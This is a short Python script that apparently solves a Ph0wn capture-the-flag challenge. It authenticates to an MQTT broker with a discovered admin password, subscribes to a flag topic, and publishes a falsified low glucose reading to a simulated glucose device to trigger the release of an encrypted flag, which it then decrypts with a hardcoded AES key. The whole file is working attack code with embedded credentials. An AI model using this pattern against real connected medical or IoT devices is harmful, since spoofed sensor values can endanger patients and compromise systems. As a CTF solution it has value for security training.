#!/usr/bin/env python

import paho.mqtt.client as mqtt
import base64
from Crypto.Cipher import AES

#def decrypt_token(encrypted_token, password='security@ph0wn_4'):
def decrypt_token(encrypted_token, password='France1_weeds000'):
    print "[hacker] "+encrypted_token
    # The message is quite obviously base64 encoded. We decode it.
    decoded = base64.b64decode(encrypted_token)

    # The message says this is AES with password of admin, so we decrypt.
    assert len(password) == 16, "Bad key length"
    cipher = AES.new(password)
    plaintext = cipher.decrypt(decoded[34:])
    print plaintext
    return plaintext

def on_message(client, userdata, msg):
    print "[hacker] Topic: "+ msg.topic+ " Message: "+str(msg.payload)
    if msg.topic == 'ph0wn18/flag':
        print "Received encrypted flag"
        decrypt_token(msg.payload[28:])
        client.disconnect() # we're done

# -------------- MAIN --------------------        
client = mqtt.Client(userdata='hacker')
client.username_pw_set(username='admin', password='Sugar1sBaaaaaaad') # step1: find admin password is Sugar1sBaaa..d
client.on_message = on_message
client.connect("10.210.17.67", 1883, 60)

print "connected"
client.subscribe("ph0wn18/flag") # it is sufficient to listen to this topic, but we can also listen to all : ph0wn/#

print "publishing teamid"
client.publish('ph0wn18/teamid','team12') # to be able to decrypt the flag

print "publishing glucose"
client.publish("ph0wn18/glucose-level", "10") # hack the glucose device by sending a low value, this triggers step2 that sends the encrypted flag

client.loop_forever()



